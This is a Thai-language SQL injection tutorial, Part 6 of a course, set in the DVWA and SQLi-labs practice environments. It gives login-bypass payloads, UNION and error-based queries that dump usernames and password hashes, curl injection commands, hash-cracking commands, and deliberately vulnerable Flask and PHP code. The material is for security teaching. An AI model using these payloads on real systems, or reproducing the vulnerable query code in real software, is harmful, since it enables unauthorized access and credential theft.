# Part 006: Your First SQL Injection
## SQL Injection แรกของคุณ - การระบุและทดสอบช่องโหว่

**ระดับ:** ⭐⭐ Easy  
**เวลาที่ใช้เรียน:** 4-5 ชั่วโมง (รวมการฝึกหัด)  
**Prerequisites:** Part 001-005, Lab Environment (Part 009)

> ⚠️ **สำคัญ:** ทดสอบใน Lab Environment เท่านั้น! เช่น DVWA, WebGoat, SQLi-labs  
> ห้ามทดสอบกับระบบจริงโดยเด็ดขาด

---

## 🎯 วัตถุประสงค์การเรียนรู้

เมื่อเรียนจบบทนี้ ผู้เรียนจะสามารถ:
1. ระบุ Injection Points ใน Web Application
2. ทดสอบ Basic SQL Injection Payloads
3. ยืนยันว่ามีช่องโหว่ SQL Injection จริง
4. ทำ Authentication Bypass อย่างง่าย
5. ดึงข้อมูลพื้นฐานจากฐานข้อมูล

---

## 1. เตรียมพร้อมก่อนเริ่ม (Pre-requisites Check)

### สิ่งที่ต้องมี:
```
✅ Lab Environment พร้อมใช้งาน (เช่น DVWA บน Docker)
✅ Burp Suite Community Edition
✅ Browser (Firefox แนะนำ)
✅ ความรู้ SQL พื้นฐานจาก Part 002-003
✅ ความเข้าใจ HTTP จาก Part 004-005
```

### สิ่งที่ต้องระวัง:
```
❌ ห้ามทดสอบกับเว็บไซต์จริง
❌ ห้ามทดสอบโดยไม่ได้รับอนุญาต
❌ ห้ามแชร์ข้อมูลที่ได้จาก Lab กับผู้อื่นในทางที่ผิด
```

---

## 2. ทำความเข้าใจ Attack Surface (พื้นที่โจมตี)

### จุดที่ต้องตรวจสอบ

```
URL Parameters:
https://target.com/product?id=5         ← id
https://target.com/search?q=laptop      ← q
https://target.com/user?name=john       ← name

HTML Forms:
<input name="username" />
<input name="password" />
<input name="search" />

HTTP Headers:
User-Agent: [VALUE]
Cookie: session_id=[VALUE]; user_id=[VALUE]
X-Forwarded-For: [VALUE]
Referer: [VALUE]

JSON Body (API):
{"id": 5, "username": "john"}
```

---

## 3. Basic Testing Methodology

### Step 1: ค้นหา Injection Points

```
1. เดิน Browse เว็บอย่างปกติ
2. จดบันทึก Parameters ทั้งหมดที่พบ
3. สังเกต URLs, Forms, Cookies
4. ใช้ Burp Suite Spider หรือ History

เครื่องมือ:
- Burp Suite → Target → Site Map
- Browser DevTools → Network Tab
- Manual Browsing + Note Taking
```

### Step 2: ทดสอบด้วย Single Quote (')

```
เหตุผล: Single Quote จะทำให้ SQL Query ไม่สมบูรณ์
ทำให้ Database เกิด Error หรือ Behavior เปลี่ยนแปลง

ทดสอบ:
URL ปกติ: /product?id=1
ทดสอบ: /product?id=1'

หรือใน Form:
Username: admin'
Password: test
```

### Step 3: วิเคราะห์ Response

```
Response ที่บ่งบอกว่ามีช่องโหว่:

1. SQL Error Message:
   "You have an error in your SQL syntax..."
   "Unclosed quotation mark..."
   "ORA-00933: SQL command not properly ended"

2. Behavior เปลี่ยนแปลง:
   - ปกติ: แสดงข้อมูล 1 รายการ
   - หลังใส่ ': ไม่แสดงข้อมูลหรือ Error

3. Response ยาวขึ้น/สั้นลง

4. HTTP Status Code เปลี่ยน (200 → 500)
```

---

## 4. การทดสอบบน DVWA (ตัวอย่างจริง)

### Setup DVWA Security Level = Low

```
1. เปิด DVWA: http://localhost/dvwa
2. Login: admin / password
3. ไปที่ DVWA Security → Set to "Low"
4. ไปที่ SQL Injection
```

### DVWA SQL Injection - Basic Testing

**URL Pattern ของ DVWA:**
```
http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```

**Step 1: ทดสอบ Basic Input**
```
ปกติ: id=1
แสดง: First name: admin, Surname: admin
```

**Step 2: ทดสอบ Single Quote**
```
ทดสอบ: id=1'
แสดง Error:
You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right syntax 
to use near ''1'' LIMIT 1' at line 1

→ ยืนยัน: มี SQL Injection!
```

**Step 3: ยืนยันด้วย Boolean Tests**
```
Test 1: id=1 AND 1=1
แสดง: First name: admin  ← ปกติ (1=1 เป็นจริง)

Test 2: id=1 AND 1=2
แสดง: ไม่แสดงอะไร ← ต่างจาก Test 1 (1=2 เป็นเท็จ)

→ ยืนยัน: Boolean-based SQLi ทำงาน!
```

---

## 5. Authentication Bypass (การผ่าน Login)

### ตัวอย่าง DVWA Login Bypass

```
Target: http://localhost/dvwa/vulnerabilities/brute/
```

**Payload ที่ใช้บ่อย:**

```sql
-- Payload 1: Always True
Username: admin'--
Password: (ใส่อะไรก็ได้)

SQL ที่สร้าง:
SELECT * FROM users WHERE username='admin'--' AND password='anything'
ผล: Login สำเร็จในฐานะ admin!

-- Payload 2: OR True
Username: ' OR '1'='1'--
Password: anything

SQL ที่สร้าง:
SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='anything'
ผล: Login ในฐานะ User แรกใน Database!

-- Payload 3: OR 1=1 (Numeric)
Username: ' OR 1=1--
Password: anything

-- Payload 4: Comment-based
Username: admin'/*
Password: */OR 1=1--

-- Payload 5: Magic Hash (PHP Specific)
Username: admin
Password: 'anything' OR '1'='1
```

### Authentication Bypass บน Login Form ทั่วไป

```python
# โค้ดที่มีช่องโหว่ (Python Flask)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # มีช่องโหว่!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    ...

# ทดสอบด้วย:
# username = admin'--
# password = anything

# SQL ที่สร้าง:
# SELECT * FROM users WHERE username='admin'--' AND password='anything'
# Comment ออกไปส่วน AND password ทำให้ข้าม Password Check!
```

---

## 6. UNION-Based Injection (ดึงข้อมูล)

### ขั้นตอนการทำ UNION-Based SQLi

**ขั้นที่ 1: หาจำนวน Columns**

```sql
-- วิธีที่ 1: ORDER BY
?id=1 ORDER BY 1--     ← ไม่ Error
?id=1 ORDER BY 2--     ← ไม่ Error
?id=1 ORDER BY 3--     ← ไม่ Error
?id=1 ORDER BY 4--     ← Error! → มี 3 Columns!

-- วิธีที่ 2: NULL
?id=0 UNION SELECT NULL--               ← Error (ไม่ใช่ 1 column)
?id=0 UNION SELECT NULL,NULL--          ← Error (ไม่ใช่ 2 columns)
?id=0 UNION SELECT NULL,NULL,NULL--     ← ไม่ Error → มี 3 Columns!
?id=0 UNION SELECT NULL,NULL,NULL,NULL--← Error (ไม่ใช่ 4 columns)
```

**ขั้นที่ 2: หา Visible Columns (ที่แสดงบนหน้าเว็บ)**

```sql
-- แทน NULL ด้วยตัวเลขหรือ String เพื่อดูว่า Column ใดแสดงผล
?id=0 UNION SELECT 1,2,3--
-- ถ้าหน้าเว็บแสดง "2" หรือ "3" → รู้ว่า Column ไหนมองเห็นได้
```

**ขั้นที่ 3: ดึงข้อมูล Database**

```sql
-- ดู Database Version
?id=0 UNION SELECT 1,version(),3--
-- แสดง: 8.0.32-MySQL Community Server

-- ดู Database ปัจจุบัน
?id=0 UNION SELECT 1,database(),3--
-- แสดง: dvwa

-- ดู Current User
?id=0 UNION SELECT 1,user(),3--
-- แสดง: dvwa@localhost
```

**ขั้นที่ 4: Enumerate Tables**

```sql
-- ดูทุก Table ใน Database ปัจจุบัน
?id=0 UNION SELECT 1,table_name,3 
FROM information_schema.tables 
WHERE table_schema=database()--

-- ผล:
-- users
-- guestbook

-- ดูทุก Table ในทุก Database
?id=0 UNION SELECT 1,table_schema,table_name 
FROM information_schema.tables--
```

**ขั้นที่ 5: Enumerate Columns**

```sql
-- ดู Columns ของตาราง users
?id=0 UNION SELECT 1,column_name,3 
FROM information_schema.columns 
WHERE table_name='users'--

-- ผล:
-- user_id
-- first_name
-- last_name
-- user
-- password
-- avatar
-- last_login
-- failed_login
```

**ขั้นที่ 6: ดึงข้อมูล**

```sql
-- ดึง Username และ Password
?id=0 UNION SELECT 1,CONCAT(user,':',password),3 
FROM users--

-- ผล (Password Hash):
-- admin:5f4dcc3b5aa765d61d8327deb882cf99
-- gordonb:e99a18c428cb38d5f260853678922e03
-- 1337:8d3533d75ae2c3966d7e0d4fcc69216b

-- CONCAT หลายข้อมูล
?id=0 UNION SELECT 1,GROUP_CONCAT(user,':',password SEPARATOR '\n'),3 
FROM users--
```

---

## 7. ตัวอย่างบน SQLi-labs

### SQLi-labs Lesson 1 (GET - Error Based - String)

```
URL: http://localhost/sqli-labs/Less-1/?id=1
```

**การทดสอบขั้นต้น:**
```
?id=1         → แสดงข้อมูล Login Name: Dumb
?id=1'        → Error! "You have an error in your SQL syntax..."
?id=1--       → แสดงข้อมูลปกติ (-- ยกเลิกส่วนที่เหลือ)
?id=1' --     → แสดงข้อมูลปกติ (ปิด quote แล้ว comment)
```

**Code ที่อยู่เบื้องหลัง:**
```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

**Payload ที่ใช้:**
```
?id=-1' UNION SELECT 1,2,3--+
?id=-1' UNION SELECT 1,version(),database()--+
?id=-1' UNION SELECT 1,group_concat(table_name),3 
         FROM information_schema.tables 
         WHERE table_schema=database()--+
?id=-1' UNION SELECT 1,group_concat(column_name),3 
         FROM information_schema.columns 
         WHERE table_name='users'--+
?id=-1' UNION SELECT 1,group_concat(username,':',password),3 
         FROM users--+
```

### SQLi-labs Lesson 2 (GET - Error Based - Intiger)

```
URL: http://localhost/sqli-labs/Less-2/?id=1
```

**Code:**
```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
// id ไม่มี Quotes → Numeric Context
```

**Payload:**
```
?id=1            → ปกติ
?id=1'           → Error! (เป็นหลักฐาน แต่ไม่ใช่ String context)
?id=1 AND 1=1    → ปกติ
?id=1 AND 1=2    → ไม่แสดง
?id=-1 UNION SELECT 1,2,3--
?id=-1 UNION SELECT 1,version(),database()--
```

---

## 8. Error-Based SQL Injection

### การใช้ Error Messages เพื่อดึงข้อมูล

บางครั้ง UNION ใช้ไม่ได้ แต่ Error Messages ยังสามารถให้ข้อมูลได้:

**MySQL Error-Based Techniques:**

```sql
-- EXTRACTVALUE (MySQL 5.1+)
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
-- Error: XPATH syntax error: '~8.0.32'
-- → version() = 8.0.32

-- UPDATEXML (MySQL 5.1+)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
-- Error: XPATH syntax error: '~dvwa'

-- ดึงข้อมูลจาก Table
' AND EXTRACTVALUE(1,CONCAT(0x7e,
    (SELECT GROUP_CONCAT(username,':',password) 
     FROM users LIMIT 0,1)
))--
-- Error: XPATH syntax error: '~admin:5f4dcc3b...'
```

**MSSQL Error-Based:**

```sql
-- CONVERT Error
' AND CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
-- Error: Conversion failed when converting the varchar value 'users' to data type int.

-- สร้าง Error ที่มีข้อมูล
' AND 1=CONVERT(int,(SELECT @@version))--
```

---

## 9. การใช้ Burp Suite ในการทดสอบ

### Burp Suite - Manual Testing

```
1. เปิด Burp Suite
2. ตั้งค่า Proxy (127.0.0.1:8080)
3. เปิด Browser ผ่าน Proxy
4. Browse ไปที่ Target

5. ส่ง Request ไปที่ Repeater:
   - คลิกขวาที่ Request
   - Send to Repeater
   
6. แก้ไข Parameter:
   id=1 → id=1'
   id=1 → id=1 OR 1=1
   
7. ส่ง Request และดู Response
```

### Burp Suite - Intruder (Basic Fuzzing)

```
1. ส่ง Request ไปที่ Intruder
2. เลือก Payload Position (§marker§)
3. เลือก Payload Type:
   - Simple list: รายการ Payload
4. Load Payload List:
   - ' (single quote)
   - " (double quote)  
   - ` (backtick)
   - 1 OR 1=1
   - 1' OR '1'='1
   - admin'--
5. Start Attack
6. วิเคราะห์ Response Length/Status Code
```

---

## 10. Testing Different Input Types

### Testing URL Parameters

```bash
# ใช้ curl สำหรับทดสอบ
# Basic Test
curl "http://localhost/dvwa/sqli/?id=1&Submit=Submit"

# Single Quote Test
curl "http://localhost/dvwa/sqli/?id=1'&Submit=Submit"

# UNION Test
curl "http://localhost/dvwa/sqli/?id=-1+UNION+SELECT+1,version(),3--+&Submit=Submit"

# URL Encoded
curl "http://localhost/dvwa/sqli/?id=1%27&Submit=Submit"
```

### Testing Form Inputs

```bash
# POST Form Test
curl -X POST \
  -d "username=admin'--&password=anything&Login=Login" \
  -b "PHPSESSID=yourtoken" \
  "http://localhost/dvwa/vulnerabilities/brute/"
```

### Testing Cookies

```bash
# Cookie Injection
curl -H "Cookie: user_id=1 OR 1=1; PHPSESSID=token" \
  "http://localhost/target/"
```

### Testing Headers

```bash
# User-Agent Injection
curl -H "User-Agent: Mozilla/5.0' AND SLEEP(5)--" \
  "http://localhost/target/"

# X-Forwarded-For Injection
curl -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" \
  "http://localhost/target/"
```

---

## 11. การทดสอบ JSON API

### API Endpoint Testing

```bash
# ทดสอบ JSON API
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"id": "1 OR 1=1"}' \
  "http://localhost/api/products"

# Testing String Parameter
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "test"}' \
  "http://localhost/api/login"
```

### JSON Body ที่มีช่องโหว่

```python
# Backend ที่มีช่องโหว่ (Python)
@app.route('/api/search', methods=['POST'])
def search():
    data = request.get_json()
    keyword = data.get('keyword', '')
    
    # มีช่องโหว่!
    cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{keyword}%'")
    
    return jsonify(cursor.fetchall())
```

**Payload สำหรับ JSON:**
```json
{
    "keyword": "%' UNION SELECT 1,version(),3-- "
}
```

---

## 12. Common Payloads รวม

### Detection Payloads

```sql
-- Basic Detection
'
''
`
``
,
"
""
/
//
\
\\
;
'%2c
'%27
-- -
#
/*comment*/
/*!

-- Boolean Tests
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
1 AND 1=1--
1 AND 1=2--
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
```

### Authentication Bypass Payloads

```sql
-- Admin Login
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR '1'='1--
') OR '1'='1#
' OR '1'='1'--
' OR 'x'='x

-- Any User
' OR 1=1 LIMIT 1--
' OR 1=1 LIMIT 1#
' OR 1=1--
1' OR '1'='1

-- With Password Field
Username: admin
Password: ' OR '1'='1

Username: admin'--
Password: anything
```

### UNION Detection Payloads

```sql
-- หา Column Count
ORDER BY 1--
ORDER BY 2--
ORDER BY 100--

-- UNION NULL
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--

-- UNION with String/Number
UNION SELECT 'a'--
UNION SELECT 1--
UNION SELECT 1,'a'--
```

---

## 13. วิเคราะห์ Response

### ตีความ Response Patterns

```
Scenario 1: Error Message
Response: "You have an error in your SQL syntax..."
ความหมาย: มี SQLi! Database = MySQL
ทำต่อ: ทดสอบ UNION/Error-Based

Scenario 2: Different Content
id=1 → แสดงข้อมูล 1 รายการ
id=1 OR 1=1 → แสดงข้อมูลทั้งหมด
ความหมาย: มี SQLi! Boolean-based ทำงาน

Scenario 3: Blank Page / No Result
id=1 → แสดงข้อมูล
id=1' → ไม่แสดง
ความหมาย: อาจมี SQLi แต่ Error ถูกซ่อน
ทำต่อ: ทดสอบ Blind SQLi

Scenario 4: Consistent Response
id=1 → แสดงข้อมูล
id=1' → แสดงข้อมูลเหมือนกัน
ความหมาย: อาจปลอดภัย หรือมี Error Handling ที่ดี

Scenario 5: Time Delay
id=1 AND SLEEP(5) → Response ช้าลง 5 วินาที
ความหมาย: มี SQLi! Time-based ทำงาน
```

---

## 14. Hands-on: DVWA Full Exploitation

### เป้าหมาย: ดึง Username และ Password ทั้งหมดจาก DVWA

```
Step 1: ยืนยัน SQLi
URL: ?id=1'
ผล: SQL Error → ยืนยันว่ามีช่องโหว่

Step 2: หาจำนวน Column
?id=1 ORDER BY 1--   → OK
?id=1 ORDER BY 2--   → OK
?id=1 ORDER BY 3--   → Error! → 2 Columns

Step 3: หา Visible Column
?id=-1 UNION SELECT 1,2--
ผล: แสดง 2 ในหน้าเว็บ → Column 2 มองเห็นได้

Step 4: ดึง System Info
?id=-1 UNION SELECT 1,database()--
ผล: dvwa

?id=-1 UNION SELECT 1,version()--
ผล: 5.5.28-MariaDB

?id=-1 UNION SELECT 1,user()--
ผล: root@localhost

Step 5: ดึง Tables
?id=-1 UNION SELECT 1,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema='dvwa'--
ผล: guestbook,users

Step 6: ดึง Columns ของ users
?id=-1 UNION SELECT 1,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name='users'--
ผล: user_id,first_name,last_name,user,password,avatar,last_login,failed_login

Step 7: ดึง Credentials!
?id=-1 UNION SELECT 1,group_concat(user,':',password SEPARATOR '\n') 
FROM users--
ผล:
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithý:5f4dcc3b5aa765d61d8327deb882cf99

Step 8: Crack the Hashes (MD5)
5f4dcc3b5aa765d61d8327deb882cf99 = password
e99a18c428cb38d5f260853678922e03 = abc123
8d3533d75ae2c3966d7e0d4fcc69216b = charley
0d107d09f5bbe40cade3de5c71e9e9b7 = letmein
```

---

## 15. Password Hash Cracking (หลังจาก Dump)

### MD5 Hash (DVWA ตัวอย่าง)

```bash
# ใช้ hashid เพื่อระบุประเภท Hash
hashid 5f4dcc3b5aa765d61d8327deb882cf99
# [+] MD2 
# [+] MD5

# ใช้ hashcat เพื่อ Crack
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# Result: 5f4dcc3b5aa765d61d8327deb882cf99:password

# ใช้ john the ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Online Hash Cracking (สำหรับ Lab เท่านั้น)
# crackstation.net
# hashes.com
```

---

## 16. Documentation และ Reporting

### การบันทึก Evidence

```
เมื่อพบ SQL Injection ควรบันทึก:

1. URL/Endpoint ที่พบช่องโหว่
2. Parameter ที่มีช่องโหว่
3. Payload ที่ใช้
4. Expected Request
5. Actual Response
6. Screenshot ของ Evidence

ตัวอย่าง Report Format:
─────────────────────────────────────────
Vulnerability: SQL Injection (Boolean-Based)
Location: /products?id=VULNERABLE
Parameter: id (GET)
Type: Boolean-Based Blind
Database: MySQL 5.5.28

Payload Used:
  ?id=1 AND 1=1 (returns data)
  ?id=1 AND 1=2 (returns no data)

Evidence:
  - Screenshot 1: Normal response with id=1
  - Screenshot 2: Response with id=1 AND 1=2 (empty)
  
Data Accessible:
  - All database names
  - All tables in current database
  - Usernames and password hashes
─────────────────────────────────────────
```

---

## 📝 แบบฝึกหัด

### Exercise 1: DVWA Testing

บน DVWA Security Level = Low:
1. ทดสอบทุก Input Parameter บนหน้า SQL Injection
2. ยืนยัน SQLi ด้วย Boolean Test
3. หาจำนวน Columns
4. ดึง Database Name, Version, User
5. ดึงรายชื่อ Table ทั้งหมด
6. ดึงข้อมูลจาก Table users

### Exercise 2: Login Bypass

บน DVWA Brute Force Page:
1. ทดสอบ Authentication Bypass Payloads ต่างๆ
2. หา Payload ที่ Login สำเร็จ
3. อธิบายเหตุผลที่ Payload ทำงาน

### Exercise 3: Header Injection

สร้าง PHP Script ที่บันทึก User-Agent ลงฐานข้อมูล:
1. ทดสอบ User-Agent Injection
2. บันทึก Payload ที่ใช้
3. ดึงข้อมูลจากฐานข้อมูล

---

## 🏆 Challenge

**Challenge 1:** บน SQLi-labs บทที่ 1-5:
1. ระบุประเภทของ Injection ในแต่ละบท
2. ใช้ UNION เพื่อดึงข้อมูลทั้งหมด
3. บันทึก Payloads ที่ใช้ได้ผล

**Challenge 2:** สร้าง Cheat Sheet ส่วนตัว:
1. รวบรวม Payloads ที่ทดสอบแล้วได้ผล
2. จัดหมวดหมู่ตาม Context
3. เพิ่ม Notes เกี่ยวกับ Response Patterns

---

## 🔑 สรุป

```
1. การทดสอบ SQLi เริ่มจากการระบุ Input Points

2. Single Quote (') เป็น Payload เริ่มต้นที่ง่ายที่สุด

3. Boolean Tests (1=1 vs 1=2) ยืนยันการมีอยู่ของ SQLi

4. UNION ใช้ดึงข้อมูลจาก Database แต่ต้องรู้จำนวน Column ก่อน

5. information_schema เก็บข้อมูล Metadata ของทุก Table

6. Error Messages ช่วยระบุประเภท Database และยืนยัน SQLi

7. บันทึก Evidence เสมอ พร้อม Screenshot
```

---

## ➡️ ถัดไป

**Part 007: Types of SQL Injection**  
- In-band SQLi (Error-based, UNION-based)
- Blind SQLi (Boolean-based, Time-based)
- Out-of-band SQLi
- เลือก Technique ที่เหมาะสมตามสถานการณ์

---

*Part 006 | SQL Injection Mastery Course | Security Education Only*
